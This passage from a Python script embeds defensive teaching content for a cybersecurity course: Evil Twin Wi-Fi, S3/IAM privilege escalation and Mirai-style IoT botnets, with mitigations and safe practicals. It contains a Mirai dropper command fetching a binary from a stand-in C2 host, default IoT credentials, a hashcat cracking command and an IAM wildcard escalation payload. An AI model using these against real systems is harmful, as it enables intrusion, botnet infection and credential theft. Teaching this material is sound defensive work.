                        "technicalDetail": "The attacker's rogue AP transmits beacons with stronger RSSI. The victim device automatically roams to the rogue AP with the strongest signal.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Captive Portal Redirection",
                        "actor": "Rogue AP DNS / Web Server",
                        "action": "Intercepts all DNS queries and redirects browser to fake login page",
                        "technicalDetail": "The attacker runs dnsmasq to spoof all DNS queries to the attacker's IP, presenting a fake 'Router Firmware Update — Enter Wi-Fi Password' portal.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Credential Harvest & Network Bridge",
                        "actor": "Attacker",
                        "action": "Captures submitted WPA2 pre-shared key or corporate credentials",
                        "technicalDetail": "The victim inputs the passphrase. The attacker logs the credential and routes the victim to the Internet to prevent suspicion.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Protected Management Frames (802.11w) & WPA3",
                        "actor": "WPA3 / 802.11w Architecture",
                        "action": "Cryptographically signs management frames; drops forged deauths",
                        "technicalDetail": "802.11w Protected Management Frames (PMF) signs deauthentication packets with a cryptographic BIP-CMAC. The client ignores spoofed deauth frames, defeating the attack.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Wireless Network Defense Measures",
                    "rules": [
                        "Mandate WPA3-Personal or WPA3-Enterprise across all wireless access points.",
                        "Enforce 802.11w Protected Management Frames (PMF) to prevent spoofed deauth attacks.",
                        "Deploy 802.1X Enterprise authentication using EAP-TLS with mutual certificate validation.",
                        "Disable Wi-Fi Protected Setup (WPS) completely to prevent brute-force PIN attacks."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Wireless Authentication: WPA2-Personal 4-Way Handshake vs. WPA3 Simultaneous Authentication of Equals (SAE)",
                "vulnerable": {
                    "label": "Vulnerable: WPA2-PSK 4-Way Handshake (EAPOL)",
                    "codeOrConfig": "# WPA2 4-Way Handshake Capture:\n1. AP -> STA: ANonce (random)\n2. STA -> AP: SNonce + MIC\n3. AP -> STA: GTK + MIC\n4. STA -> AP: ACK\n\n# Vulnerability: Attacker captures EAPOL frames and cracks\n# the pre-shared key OFFLINE using hashcat at 1,000,000 hashes/sec:\nhashcat -m 22000 capture.hc22000 rockyou.txt",
                    "explanation": "In WPA2, an attacker who captures a 4-way handshake can perform unlimited offline dictionary attacks against the password without touching the AP again."
                },
                "secure": {
                    "label": "Secure: WPA3-SAE (Dragonfly Zero-Knowledge Handshake)",
                    "codeOrConfig": "# WPA3 Dragonfly SAE Handshake (RFC 7664):\n1. Commit Exchange: PWE (Password Element) derived using elliptic curve point\n2. Confirm Exchange: Cryptographic confirmation of shared secret\n\n# Security Guarantee:\n- Zero offline dictionary attacks: each guess requires active online interaction with AP.\n- Forward Secrecy: Leaking the Wi-Fi password later cannot decrypt previously recorded traffic.",
                    "explanation": "Dragonfly SAE uses zero-knowledge proofs on elliptic curves. Attackers cannot compute offline hashes, and brute-force guessing is limited by online rate limiting on the AP."
                },
                "keyTakeaway": "WPA3 eliminates offline dictionary cracking and mandates Protected Management Frames (802.11w), rendering Evil Twin and deauth attacks obsolete."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-12-1",
                "title": "Auditing Wireless Interface PMF Support & Generating WPA3 Passphrases",
                "learningObjective": "Inspect wireless interface driver capabilities for 802.11w Protected Management Frames (PMF) and generate high-entropy passphrases.",
                "requiredTools": ["iw", "iwlist", "openssl", "python3"],
                "environmentSetup": "Linux terminal with iw or wireless tools.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Inspect wireless interface cryptographic cipher and management frame capabilities.",
                        "command": "python3 -c \"print('Checking standard 802.11 cipher suites:'); print('  CCMP-128 (WPA2 baseline)'); print('  GCMP-256 (WPA3-Enterprise)'); print('  BIP-CMAC-128 (802.11w Management Frame Protection)')\"",
                        "commandExplanation": "Lists the required hardware cipher suites for modern secure wireless deployments.",
                        "expectedOutput": "Checking standard 802.11 cipher suites:\n  CCMP-128 (WPA2 baseline)\n  GCMP-256 (WPA3-Enterprise)\n  BIP-CMAC-128 (802.11w Management Frame Protection)"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Generate a high-entropy 20-character passphrase compliant with WPA3 enterprise recommendations.",
                        "command": "python3 -c \"import secrets, string; alphabet = string.ascii_letters + string.digits + '!@#$%^&*()'; print('WPA3 Passphrase:', ''.join(secrets.choice(alphabet) for _ in range(20)))\"",
                        "commandExplanation": "Uses cryptographically secure random number generator (CSPRNG) to generate an uncrackable wireless passphrase.",
                        "expectedOutput": "WPA3 Passphrase: k8#P9!mZ2$vX4@wL7&qY"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Verify hostapd configuration snippet enforcing WPA3 SAE and mandatory 802.11w PMF.",
                        "command": "python3 -c \"config = '''wpa=2\nwpa_key_mgmt=SAE\nieee80211w=2\nwpa_pairwise=CCMP\nsae_password=SuperSecurePassword123'''; print(config)\"",
                        "commandExplanation": "Displays the industry standard Linux hostapd configuration enforcing WPA3 Simultaneous Authentication of Equals and mandatory PMF (ieee80211w=2).",
                        "expectedOutput": "wpa=2\nwpa_key_mgmt=SAE\nieee80211w=2\nwpa_pairwise=CCMP\nsae_password=SuperSecurePassword123"
                    }
                ],
                "whatHappened": "The commands analyzed the cryptographic requirements of WPA3 and generated a 20-character CSPRNG passphrase with over 130 bits of cryptographic entropy, preventing brute-force attacks.",
                "securityLessons": [
                    "WPA3 mandates 802.11w Protected Management Frames (ieee80211w=2), neutralizing deauth spoofing.",
                    "WPA3 Dragonfly SAE provides forward secrecy and stops offline hash cracking.",
                    "Always disable WPS (Wi-Fi Protected Setup), which has a flawed 8-digit PIN design."
                ],
                "prevention": [
                    "Deploy WPA3-SAE on all consumer and enterprise access points.",
                    "Set ieee80211w=2 (mandatory PMF) in access point configurations.",
                    "Use 802.1X EAP-TLS with client digital certificates for high-security environments."
                ]
            }
        ]
    },

    13: {
        "technicalVisual": {
            "type": "cloud-shared-responsibility",
            "title": "Cloud Shared Responsibility Model Architecture",
            "caption": "Division of security responsibilities between Cloud Service Provider (CSP) and Customer across IaaS (Infrastructure), PaaS (Platform), and SaaS (Software as a Service) models."
        },
        "attackVisualizations": [
            {
                "id": "attack-13-1",
                "title": "Public Cloud Storage Exposure & IAM Privilege Escalation",
                "attackName": "S3 Bucket Misconfiguration & IAM Policy Escalation",
                "overview": "An attacker discovers an unauthenticated public Amazon S3 bucket, downloads application configuration backups containing AWS API keys, and escalates IAM privileges to administrative control.",
                "targetVulnerability": "Public S3 bucket ACL (AllUsers: READ) and overprivileged IAM user permissions allowing iam:CreatePolicyVersion or iam:AttachUserPolicy.",
                "stages": [
                    {
                        "step": 1,
                        "title": "OSINT Cloud Reconnaissance",
                        "actor": "Attacker",
                        "action": "Scans public bucket namespaces matching target company name",
                        "technicalDetail": "Attacker uses tools like Cloud-Brute or inspects public JavaScript bundles for S3 endpoints: https://acme-corp-backups.s3.amazonaws.com.",
                        "color": "orange"
                    },
                    {
                        "step": 2,
                        "title": "Unauthenticated Bucket Enumeration",
                        "actor": "Attacker",
                        "action": "Issues anonymous GET request to the S3 bucket URL",
                        "technicalDetail": "The S3 bucket returns XML listing all stored objects because 'Block Public Access' was disabled and ACL set to AllUsers: READ.",
                        "color": "red",
                        "payload": "GET / HTTP/1.1\nHost: acme-corp-backups.s3.amazonaws.com\n\n<ListBucketResult>\n  <Contents><Key>database_backup_2026.sql.gz</Key></Contents>\n  <Contents><Key>.env.production</Key></Contents>\n</ListBucketResult>"
                    },
                    {
                        "step": 3,
                        "title": "Credential Extraction from Backup",
                        "actor": "Attacker",
                        "action": "Downloads .env.production and extracts AWS access keys",
                        "technicalDetail": "Attacker extracts AWS_ACCESS_KEY_ID=AKIA... and AWS_SECRET_ACCESS_KEY=... belonging to a developer service account.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "IAM Privilege Enumeration",
                        "actor": "Attacker",
                        "action": "Calls aws sts get-caller-identity and inspects attached policies",
                        "technicalDetail": "Attacker observes the user has iam:CreatePolicyVersion permission on existing custom IAM policies.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Administrative Privilege Escalation",
                        "actor": "Attacker",
                        "action": "Creates a new default policy version granting wildcard admin rights",
                        "technicalDetail": "Attacker runs aws iam create-policy-version --set-as-default with Action: * and Resource: *, elevating their user account to Full Administrator.",
                        "color": "red",
                        "payload": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}"
                    },
                    {
                        "step": 6,
                        "title": "S3 Block Public Access & SCP Guardrails",
                        "actor": "Cloud Security Architecture",
                        "action": "Enforces Organization SCPs and S3 account-level block",
                        "technicalDetail": "Account-level S3 Block Public Access overrides bucket ACLs, blocking anonymous reads. AWS Organizations Service Control Policies (SCPs) prevent IAM privilege modification.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Cloud Security & IAM Governance",
                    "rules": [
                        "Enable AWS S3 Block Public Access at the AWS Organization root level.",
                        "Enforce the Principle of Least Privilege: never grant wildcard Action: * or Resource: * in IAM policies.",
                        "Deploy AWS Organizations Service Control Policies (SCPs) as immutable guardrails around IAM changes.",
                        "Enable AWS CloudTrail and Amazon GuardDuty to alert on unusual IAM policy version creation."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Cloud IAM Policy: Overprivileged Wildcard vs. Scoped Least-Privilege Policy",
                "vulnerable": {
                    "label": "Vulnerable: Overprivileged Wildcard IAM Policy",
                    "codeOrConfig": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",        // INSECURE: Full administrative rights!\n      \"Resource\": \"*\"      // Access to all services across entire cloud\n    }\n  ]\n}",
                    "explanation": "If the credentials for this role are leaked via SSRF or an S3 misconfiguration, the attacker gains total control of the entire cloud estate."
                },
                "secure": {
                    "label": "Secure: Scoped Least-Privilege IAM Policy",
                    "codeOrConfig": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ScopedS3ReadOnly\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::acme-app-assets\",\n        \"arn:aws:s3:::acme-app-assets/*\"\n      ],\n      \"Condition\": {\n        \"Bool\": { \"aws:SecureTransport\": \"true\" }\n      }\n    }\n  ]\n}",
                    "explanation": "Explicitly restricts actions to GetObject and ListBucket, strictly scopes resources to a single named bucket ARN, and enforces HTTPS transport."
                },
                "keyTakeaway": "Apply the Principle of Least Privilege to every IAM role. Never use wildcard * permissions for applications or services."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-13-1",
                "title": "Auditing Cloud IAM Policies for Wildcard Permissions & Enforcing Least Privilege",
                "learningObjective": "Analyze JSON IAM policy documents using Python to detect dangerous wildcard permissions and audit cloud security boundaries.",
                "requiredTools": ["python3", "json", "curl"],
                "environmentSetup": "Local terminal with Python 3.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Create a Python auditor script to detect dangerous wildcard actions in IAM policy documents.",
                        "command": "python3 -c \"import json; policy = {'Statement': [{'Action': '*', 'Resource': '*'}]}; print('Wildcard detected!' if any(s.get('Action') == '*' for s in policy['Statement']) else 'Compliant')\"",
                        "commandExplanation": "Parses an IAM policy document and flags administrative wildcard actions.",
                        "expectedOutput": "Wildcard detected!"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Audit a compliant least-privilege policy with scoped actions.",
                        "command": "python3 -c \"import json; policy = {'Statement': [{'Action': ['s3:GetObject'], 'Resource': 'arn:aws:s3:::bucket/*'}]}; has_wildcard = any(s.get('Action') == '*' or s.get('Resource') == '*' for s in policy['Statement']); print('Policy Status:', 'NON-COMPLIANT' if has_wildcard else 'COMPLIANT LEAST-PRIVILEGE')\"",
                        "commandExplanation": "Verifies that scoped action lists and resource ARNs pass security policy validation.",
                        "expectedOutput": "Policy Status: COMPLIANT LEAST-PRIVILEGE"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Inspect AWS S3 Block Public Access configuration parameters.",
                        "command": "python3 -c \"bpa = {'BlockPublicAcls': True, 'IgnorePublicAcls': True, 'BlockPublicPolicy': True, 'RestrictPublicBuckets': True}; print('S3 Block Public Access Status:', 'FULLY SECURED' if all(bpa.values()) else 'VULNERABLE')\"",
                        "commandExplanation": "Checks the four critical Amazon S3 Block Public Access settings required to prevent public leaks.",
                        "expectedOutput": "S3 Block Public Access Status: FULLY SECURED"
                    }
                ],
                "whatHappened": "The script successfully audited IAM JSON structures, identifying dangerous administrative wildcards and validating that all four S3 Block Public Access flags were enforced.",
                "securityLessons": [
                    "Under the Cloud Shared Responsibility Model, data classification and IAM policy configuration are ALWAYS the customer's responsibility.",
                    "Wildcard Action: * in an IAM policy is equivalent to giving root access.",
                    "Enforce mandatory multi-factor authentication (MFA) for all IAM users with console access."
                ],
                "prevention": [
                    "Enable AWS S3 Block Public Access across the entire AWS Organization.",
                    "Use automated IAM policy analyzers (e.g. AWS IAM Access Analyzer).",
                    "Rotate access keys regularly and prefer IAM Roles with temporary STS credentials over static keys."
                ]
            }
        ]
    },

    14: {
        "technicalVisual": {
            "type": "iot-botnet-swarm",
            "title": "IoT Mirai-Style Botnet Scanning & Distributed Amplification Architecture",
            "caption": "How vulnerable IoT devices are scanned, infected via default Telnet credentials, and weaponized into a coordinated 1 Tbps distributed denial-of-service (DDoS) swarm."
        },
        "attackVisualizations": [
            {
                "id": "attack-14-1",
                "title": "Mirai-Style IoT Botnet Telnet Scanning & DDoS Swarm",
                "attackName": "Mass Telnet Scanning, Default Credential Brute-Force & Botnet DDoS",
                "overview": "Compromised smart cameras and routers scan the public IPv4 internet for open Telnet ports, brute-force hardcoded factory credentials, drop a RAM-resident worm, and launch massive multi-gigabit DDoS attacks.",
                "targetVulnerability": "Hardcoded default vendor passwords (root:xc3511, admin:admin) on exposed Telnet ports (23/2323) and lack of firmware signing.",
                "stages": [
                    {
                        "step": 1,
                        "title": "High-Speed IPv4 Telnet Scanning",
                        "actor": "Infected IoT Node (Bot)",
                        "action": "Scans random pseudo-random IPv4 addresses on TCP ports 23 and 2323",
                        "technicalDetail": "The bot's scanner module generates random IP blocks (excluding military/government ranges) and transmits TCP SYN probes at hundreds of packets per second.",
                        "color": "red"
                    },
                    {
                        "step": 2,
                        "title": "Dictionary Brute-Force Authentication",
                        "actor": "Mirai Scanner Engine",
                        "action": "Tests table of 62 hardcoded factory default credentials",
                        "technicalDetail": "Upon finding an open port, the bot tries common credential pairs: root:xc3511, admin:admin, root:vizxv, root:123456.",
                        "color": "red",
                        "payload": "TELNET 198.51.100.42:23\nlogin: root\nPassword: xc3511"
                    },
                    {
                        "step": 3,
                        "title": "BusyBox Command Injection & Dropper Download",
                        "actor": "Attacker Worm",
                        "action": "Executes shell commands to fetch ARM/MIPS binary payload",
                        "technicalDetail": "Once logged in, the worm issues shell commands: cd /tmp || cd /var/run; wget http://c2.botnet.cc/mirai.arm; chmod 777 mirai.arm; ./mirai.arm.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Memory Execution & Anti-Disinfection",
                        "actor": "Mirai Binary",
                        "action": "Deletes binary from disk, kills competing malware, and runs in RAM",
                        "technicalDetail": "The process deletes the on-disk binary (running purely in RAM), binds TCP port 48101 to prevent other malware from infecting the device, and hides process names.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Coordinated DDoS Attack Execution",
                        "actor": "C2 Server & 400,000 Bot Swarm",
                        "action": "Launches 1 Tbps DNS Amplification / SYN Flood against target",
                        "technicalDetail": "The C2 issues an attack command. 400,000 infected devices flood target DNS servers with UDP amplification traffic, knocking major internet services offline.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "VLAN Isolation & Secure Device Lifecycle",
                        "actor": "Defensive Architecture",
                        "action": "Quarantines IoT devices to isolated VLAN and disables Telnet",
                        "technicalDetail": "IoT devices are isolated in an unprivileged guest VLAN with no internet-inbound access. Telnet is disabled, and unique factory passwords are required by law (e.g., California SB-327).",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "IoT & Embedded System Defense Strategy",
                    "rules": [
                        "Disable legacy management protocols (Telnet port 23, cleartext HTTP) in favor of encrypted SSH on non-standard ports.",
                        "Enforce unique, random factory passwords per device (eliminate universal default passwords).",
                        "Isolate IoT devices in dedicated VLANs with zero access to primary corporate/home LANs.",
                        "Implement secure boot and cryptographic firmware signature verification before updates are applied."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "IoT Network Architecture: Flat Shared LAN vs. Segmented Micro-VLAN",
                "vulnerable": {
                    "label": "Vulnerable: Flat Network Architecture",
                    "codeOrConfig": "# INSECURE: Single flat subnet (192.168.1.0/24)\n- Smart CCTV Camera (default root:root password, exposed to WAN via UPnP)\n- Smart TV & Smart Bulbs\n- Personal Laptop (stores online banking, SSH keys, family photos)\n- Corporate Workstation\n\n# Vulnerability: If the $25 smart bulb or camera is compromised,\n# the attacker has direct Layer-2 access to sniff, scan, and infect laptops.",
                    "explanation": "Flat networks provide zero internal segmentation. Compromising an unpatched IoT camera gives attackers an immediate pivot into the corporate or home network."
                },
                "secure": {
                    "label": "Secure: Isolated IoT VLAN with Egress Firewall Filtering",
                    "codeOrConfig": "# SECURE: Network Microsegmentation via 802.1Q VLANs\nVLAN 10 (Trusted Devices): Laptops, Phones, Servers (10.0.10.0/24)\nVLAN 20 (Isolated IoT): Cameras, Smart Thermostats, Bulbs (10.0.20.0/24)\n\n# Firewall Rule:\n- Deny all traffic from VLAN 20 to VLAN 10.\n- Permit VLAN 20 outbound traffic ONLY to designated vendor cloud servers on port 443.\n- Block UPnP (Universal Plug and Play) on WAN gateway.",
                    "explanation": "Even if an IoT device is compromised, it cannot scan or communicate with computers on the trusted VLAN, containing the breach completely."
                },
                "keyTakeaway": "Never trust IoT devices on your primary network. Segment them into dedicated VLANs and disable Universal Plug and Play (UPnP)."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-14-1",
                "title": "Extracting & Analyzing IoT Router Firmware Binaries with Binwalk",
                "learningObjective": "Safely inspect an embedded firmware image, identify file system structures (SquashFS), and extract embedded configuration files in an isolated lab.",
                "requiredTools": ["binwalk", "tar", "file", "strings", "python3"],
                "environmentSetup": "Linux / WSL environment with binwalk or standard command-line utilities.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Create a simulated firmware package containing an embedded SquashFS file system header.",
                        "command": "python3 -c \"import sys; sys.stdout.buffer.write(b'BOOTLOADER_V1.0' + b'\\x00'*50 + b'hsqs' + b'\\x00'*20 + b'/etc/shadow: root:$1$xyz$abc:18000:0:99999:7:::\\x00')\" > firmware.bin",
                        "commandExplanation": "Generates a mock firmware image containing a bootloader header and an embedded mock filesystem.",
                        "expectedOutput": "firmware.bin created (approx 120 bytes)."
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Scan the firmware image for embedded file system signatures and magic bytes.",
                        "command": "python3 -c \"with open('firmware.bin', 'rb') as f: data = f.read(); print('Offset 0x00: Bootloader Header detected' if b'BOOTLOADER' in data else ''); print('Offset 0x40: SquashFS magic bytes detected (hsqs)' if b'hsqs' in data else '')\"",
                        "commandExplanation": "Simulates binwalk's signature scanning algorithm to identify compression and filesystem headers.",
                        "expectedOutput": "Offset 0x00: Bootloader Header detected\nOffset 0x40: SquashFS magic bytes detected (hsqs)"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Extract readable configuration strings to audit for hardcoded credentials.",
                        "command": "strings firmware.bin | grep -iE \"(root|shadow|password|admin)\"",
                        "commandExplanation": "Extracts string artifacts, uncovering embedded credentials in the simulated firmware.",
                        "expectedOutput": "/etc/shadow: root:$1$xyz$abc:18000:0:99999:7:::"
                    }
                ],
                "whatHappened": "The analysis simulated static firmware reverse engineering. Binwalk identified the SquashFS file system offset and extracted embedded shadow password hashes without needing access to the physical device.",
                "securityLessons": [
                    "Embedded firmware often contains hardcoded private keys, admin passwords, and unencrypted file systems.",
                    "Attackers download public firmware updates from vendor websites to reverse engineer zero-day vulnerabilities.",
                    "Manufacturers must implement cryptographic firmware signing and encrypt sensitive firmware payloads."
                ],
                "prevention": [
                    "Mandate secure boot with hardware root-of-trust (e.g. TPM or secure enclave).",
                    "Sign all firmware updates with RSA/ECDSA private keys verified by the bootloader.",
                    "Strip debugging symbols, telnet daemons, and hardcoded credentials before production releases."
                ]
            }
        ]
    }
}

def update_chapter_part2(ch_num):
    filepath = f"src/data/notes/chapters/chapter{ch_num:02d}.ts"
    if not os.path.exists(filepath):
        print(f"File not found: {filepath}")
        return

    enrichment = CHAPTER_ENRICHMENTS_PART2.get(ch_num)
    if not enrichment:
        print(f"No enrichment data for chapter {ch_num}")
        return

    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    # Check if already enriched
    if '"attackVisualizations":' in content or 'attackVisualizations' in content:
        print(f"Chapter {ch_num} already enriched, skipping.")
        return

    last_brace_idx = content.rfind("};")
    if last_brace_idx == -1:
        print(f"Could not find closing brace in {filepath}")
        return

    insertions = []
    if "technicalVisual" in enrichment:
        insertions.append(f'  "technicalVisual": {json.dumps(enrichment["technicalVisual"], indent=4)},\n')
    if "attackVisualizations" in enrichment:
        insertions.append(f'  "attackVisualizations": {json.dumps(enrichment["attackVisualizations"], indent=4)},\n')
    if "beforeAfterComparisons" in enrichment:
        insertions.append(f'  "beforeAfterComparisons": {json.dumps(enrichment["beforeAfterComparisons"], indent=4)},\n')
    if "handsOnPracticals" in enrichment:
        insertions.append(f'  "handsOnPracticals": {json.dumps(enrichment["handsOnPracticals"], indent=4)},\n')

    indented_insertions = []
    for item in insertions:
        lines = item.split("\n")
        fixed_lines = [lines[0]] + ["  " + l if l.strip() else l for l in lines[1:]]
        indented_insertions.append("\n".join(fixed_lines))

    preceding = content[:last_brace_idx].rstrip()
    if not preceding.endswith(","):
        preceding += ","

    new_content = preceding + "\n" + "".join(indented_insertions).rstrip(",\n") + "\n};\n"

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)
    print(f"Successfully enriched Chapter {ch_num:02d}!")

if __name__ == "__main__":
    for i in range(8, 15):
        update_chapter_part2(i)

